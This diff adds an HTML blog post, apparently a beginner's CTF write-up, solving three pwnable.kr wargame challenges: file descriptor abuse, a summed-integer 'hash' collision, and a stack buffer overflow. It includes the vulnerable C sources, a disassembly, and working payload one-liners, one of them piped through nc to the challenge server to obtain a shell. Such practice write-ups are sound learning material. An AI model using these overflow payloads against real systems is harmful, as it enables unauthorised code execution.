@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- prerendered by tools/build.py -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>pwnable.kr: fd, collision &amp; buffer overflow · sw1tchc4se</title>
+  <meta name="description" content="The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer." />
+  <meta name="author" content="sw1tchc4se" />
+  <link rel="canonical" href="https://sw1tchc4se.github.io/post/pwnable-fd-col-bof/" />
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="sw1tchc4se" />
+  <meta property="og:title" content="pwnable.kr: fd, collision &amp; buffer overflow · sw1tchc4se" />
+  <meta property="og:description" content="The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer." />
+  <meta property="og:url" content="https://sw1tchc4se.github.io/post/pwnable-fd-col-bof/" />
+  <meta property="og:image" content="https://sw1tchc4se.github.io/assets/avatar.png" />
+  <meta property="article:published_time" content="2026-06-01" />
+  <meta property="article:tag" content="writeup" />
+  <meta property="article:tag" content="pwn" />
+  <meta property="article:tag" content="pwnable" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="pwnable.kr: fd, collision &amp; buffer overflow · sw1tchc4se" />
+  <meta name="twitter:description" content="The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer." />
+  <meta name="twitter:image" content="https://sw1tchc4se.github.io/assets/avatar.png" />
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BlogPosting", "headline": "pwnable.kr: fd, collision & buffer overflow", "description": "The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer.", "datePublished": "2026-06-01", "dateModified": "2026-06-01", "url": "https://sw1tchc4se.github.io/post/pwnable-fd-col-bof/", "mainEntityOfPage": "https://sw1tchc4se.github.io/post/pwnable-fd-col-bof/", "image": "https://sw1tchc4se.github.io/assets/avatar.png", "keywords": "writeup, pwn, pwnable", "author": {"@type": "Person", "name": "sw1tchc4se", "url": "https://sw1tchc4se.github.io/about/"}, "publisher": {"@type": "Person", "name": "sw1tchc4se"}}</script>
+  <link rel="alternate" type="application/rss+xml" title="sw1tchc4se" href="../../feed.xml" />
+  <script>
+    (function () {
+      var s = localStorage.getItem("theme") ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      document.documentElement.setAttribute("data-theme", s);
+    })();
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Nunito:wght@400;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../../css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
+</head>
+<body>
+  <main class="container">
+    <div id="article">
+      <header class="post-header">
+        <a class="back-link" href="../../posts/">← all posts</a>
+        <h1>pwnable.kr: fd, collision &amp; buffer overflow</h1>
+        <div class="post-meta">
+          <span>Jun 1, 2026</span>
+          <span>6 min read</span>
+        </div>
+        <div class="tags"><a class="tag" href="../../posts/?tag=writeup">writeup</a><a class="tag" href="../../posts/?tag=pwn">pwn</a><a class="tag" href="../../posts/?tag=pwnable">pwnable</a></div>
+      </header>
+      <article class="prose"><p>hello, today i tried out <a href="https://pwnable.kr/play.php">pwnable</a> and i started out with three basic challenges for the day, this is my writeup for them.</p>
+<h2 id="fd">[FD]</h2>
+<p>Mommy! what is a file descriptor in Linux?</p>
+<pre><code class="language-bash">fd@ubuntu:~$ ls
+fd  fd.c  flag</code></pre>
+<p>these were my files for this challenge, quite simple really. fd.c:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+char buf[32];
+int main(int argc, char* argv[], char* envp[]){
+	if(argc&lt;2){
+		printf("pass argv[1] a number\n");
+		return 0;
+	}
+	int fd = atoi( argv[1] ) - 0x1234;
+	int len = 0;
+	len = read(fd, buf, 32);
+	if(!strcmp("LETMEWIN\n", buf)){
+		printf("good job :)\n");
+		setregid(getegid(), getegid());
+		system("/bin/cat flag");
+		exit(0);
+	}
+	printf("learn about Linux file IO\n");
+	return 0;
+
+}</code></pre>
+<p>at first i tried:</p>
+<pre><code class="language-bash">fd@ubuntu:~$ ./fd LETMEWIN
+learn about Linux file IO</code></pre>
+<p>then i looked up at the linux file IO and after a little bit of reading about file descriptors, i understood that the function "read()" is vulnerable basically, when read(fd, buf, 32) gets fd==0 (for example here when you set it to 4660) it let's you write whatever you want to the buffer</p>
+<pre><code class="language-c">int fd = atoi( argv[1] ) - 0x1234;</code></pre>
+<p>when fd ==0x1234, fd==0 which then, i need to input LETMEWIN because that's the string we can see being compared to buf</p>
+<pre><code class="language-c">f(!strcmp("LETMEWIN\n", buf)</code></pre>
+<p>then, all i have to do is input 4660 to make fd==0 and write the key :)</p>
+<pre><code class="language-bash">fd@ubuntu:~$ ./fd 4660 
+LETMEWIN
+good job :)
+&lt;&lt;pwnable AUTH flag&gt;&gt;</code></pre>
+<h2 id="collision">[collision]</h2>
+<p>Daddy told me about cool MD5 hash collision today. I wanna do something like that too!</p>
+<p>same thing this time, different vulnerability</p>
+<pre><code class="language-bash">col@ubuntu:~$ ls
+col  col.c  flag 
+
+col@ubuntu:~$ cat col.c</code></pre>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+unsigned long hashcode = 0x21DD09EC;
+unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i&lt;5; i++){
+		res += ip[i];
+	}
+	return res;
+}
+
+int main(int argc, char* argv[]){
+	if(argc&lt;2){
+		printf("usage : %s [passcode]\n", argv[0]);
+		return 0;
+	}
+	if(strlen(argv[1]) != 20){
+		printf("passcode length should be 20 bytes\n");
+		return 0;
+	}
+
+	if(hashcode == check_password( argv[1] )){
+		setregid(getegid(), getegid());
+		system("/bin/cat flag");
+		return 0;
+	}
+	else
+		printf("wrong passcode.\n");
+	return 0;
+}</code></pre>
+<p>this one had me really confused, my first guess was that <code>hashcode = 0x21DD09EC</code> is an MD5 hash that has some sort of hash collision that i was supposed to find on the internet somehow, which, of course, was not the solution. and after going at it for a while, i decided to actually read the code after looking at it really hard, i think the name and comment are a little misleading, this has nothing to really do with any real hash function</p>
+<p><code>check_password</code> requires me to find a 20 byte password, that when it enters the function turns into five 32 bit integers and adds them together.</p>
+<p>so the puzzle is reduced to: find 5 ints whose sum is <code>0x21DD09EC</code> convert to dec: <code>0x21DD09EC = 568134124</code> <code>568134124 / 5 = 113626824 remainder 4</code> so four ints of <code>113626824 (0x06C5CEC8)</code> and one <code>0x06C5CEC8 + 4 = 0x06C5CECC</code></p>
+<p>then, i have to convert to Raw little-endian and pass it using python2:</p>
+<pre><code class="language-bash">./col $(python2 -c 'print "\xc8\xce\xc5\x06"*4 + "\xcc\xce\xc5\x06"')</code></pre>
+<p>that got me the auth flag !</p>
+<h2 id="bof">[bof]</h2>
+<p>Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?</p>
+<pre><code class="language-bash">bof@ubuntu:~$ ls
+bof  bof.c  readme
+bof@ubuntu:~$ cat readme 
+bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag
+bof@ubuntu:~$ nc 0 9000
+
+overflow me : Nah..
+
+bof@ubuntu:~$ cat bof.c</code></pre>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		setregid(getegid(), getegid());
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}</code></pre>
+<p>this challenge was obviously about buffer overflow, and one of the oldest ones! i have heard about this one before so when i saw the function "gets" i knew what i needed to do</p>
+<pre><code class="language-c">int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}</code></pre>
+<p>in <code>main</code> we can see that the function is called with a fixed number, <code>0xdeadbeef</code></p>
+<h3 id="the-gets-function">the gets function</h3>
+<pre><code class="language-bash">char overflowme[32];   // a box that holds 32 characters
+gets(overflowme);      // read typed input into that box</code></pre>
+<p><code>char overflowme[32]</code> is a buffer, and gets never checks if it's out of room to allow the buffer. so what we can do is write way past after the gets function</p>
+<p>basically, my goal is to change <code>key</code> to <code>0xcafebabe</code>, in this line: <code>if(key == 0xcafebabe)</code> so that when the program runs key is equal to <code>0xcafebabe</code> and the boolean is True, which will give me the shell i need</p>
+<p>first, i'll use <code>objdump</code> on the bof file and grep the function to see where the gets function starts and when the key variable starts</p>
+<pre><code class="language-bash"> objdump -d bof | grep -A40 '&lt;func&gt;:'
+000011fd &lt;func&gt;:
+    11fd:	55                   	push   %ebp
+    11fe:	89 e5                	mov    %esp,%ebp
+    1200:	56                   	push   %esi
+    1201:	53                   	push   %ebx
+    1202:	83 ec 30             	sub    $0x30,%esp
+    1205:	e8 f6 fe ff ff       	call   1100 &lt;__x86.get_pc_thunk.bx&gt;
+    120a:	81 c3 f6 2d 00 00    	add    $0x2df6,%ebx
+    1210:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
+    1216:	89 45 f4             	mov    %eax,-0xc(%ebp)
+    1219:	31 c0                	xor    %eax,%eax
+    121b:	83 ec 0c             	sub    $0xc,%esp
+    121e:	8d 83 08 e0 ff ff    	lea    -0x1ff8(%ebx),%eax
+    1224:	50                   	push   %eax
+    1225:	e8 26 fe ff ff       	call   1050 &lt;printf@plt&gt;
+    122a:	83 c4 10             	add    $0x10,%esp
+    122d:	83 ec 0c             	sub    $0xc,%esp
+    1230:	8d 45 d4             	lea    -0x2c(%ebp),%eax
+    1233:	50                   	push   %eax
+    1234:	e8 27 fe ff ff       	call   1060 &lt;gets@plt&gt;
+    1239:	83 c4 10             	add    $0x10,%esp
+    123c:	81 7d 08 be ba fe ca 	cmpl   $0xcafebabe,0x8(%ebp)
+    1243:	75 2d                	jne    1272 &lt;func+0x75&gt;
+    1245:	e8 36 fe ff ff       	call   1080 &lt;getegid@plt&gt;
+    124a:	89 c6                	mov    %eax,%esi
+    124c:	e8 2f fe ff ff       	call   1080 &lt;getegid@plt&gt;
+    1251:	83 ec 08             	sub    $0x8,%esp
+    1254:	56                   	push   %esi
+    1255:	50                   	push   %eax
+    1256:	e8 55 fe ff ff       	call   10b0 &lt;setregid@plt&gt;
+    125b:	83 c4 10             	add    $0x10,%esp
+    125e:	83 ec 0c             	sub    $0xc,%esp
+    1261:	8d 83 17 e0 ff ff    	lea    -0x1fe9(%ebx),%eax
+    1267:	50                   	push   %eax
+    1268:	e8 33 fe ff ff       	call   10a0 &lt;system@plt&gt;
+    126d:	83 c4 10             	add    $0x10,%esp
+    1270:	eb 12                	jmp    1284 &lt;func+0x87&gt;
+    1272:	83 ec 0c             	sub    $0xc,%esp
+    1275:	8d 83 1f e0 ff ff    	lea    -0x1fe1(%ebx),%eax
+    127b:	50                   	push   %eax
+    127c:	e8 0f fe ff ff       	call   1090 &lt;puts@plt&gt;</code></pre>
+<p>we can see that the gets function starts at <code>ebp - 0x2c = 44 below ebp </code></p>
+<pre><code class="language-bash">    1230:	8d 45 d4             	lea    -0x2c(%ebp),%eax
+    1233:	50                   	push   %eax
+    1234:	e8 27 fe ff ff       	call   1060 &lt;gets@plt&gt;</code></pre>
+<p>then, we can see that the value of <code>0xcafebabe</code> starts at 8 above ebp</p>
+<pre><code class="language-bash">123c:	81 7d 08 be ba fe ca 	cmpl   $0xcafebabe,0x8(%ebp)</code></pre>
+<p>which means there's a 52 byte gap between them. so i need to make a payload that writes random junk into that 52 byte offset and then changes <code>key</code> to <code>0xcafebabe</code></p>
+<p>this is what i came up with: <code>(python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000</code> b"A"*52 covers everything for those 52 bytes with A and +  \xbe\xba\xfe\xca writes the key, but it didn't work for some reason.</p>
+<p>so this is what i ended up actually using: <code>(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52+b"\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000</code></p>
+<p>this is because of python3 syntax, i've heard from someone that my first command would have worked if i had used python2, but i can't confirm or deny that. after that i got a shell and read the flag!</p></article>
+    </div>
+  </main>
+
+  <script>window.__POST_SLUG__ = "pwnable-fd-col-bof";</script>
+  <script src="../../js/blog.js"></script>
+  <script src="../../js/post.js"></script>
+</body>
+</html>
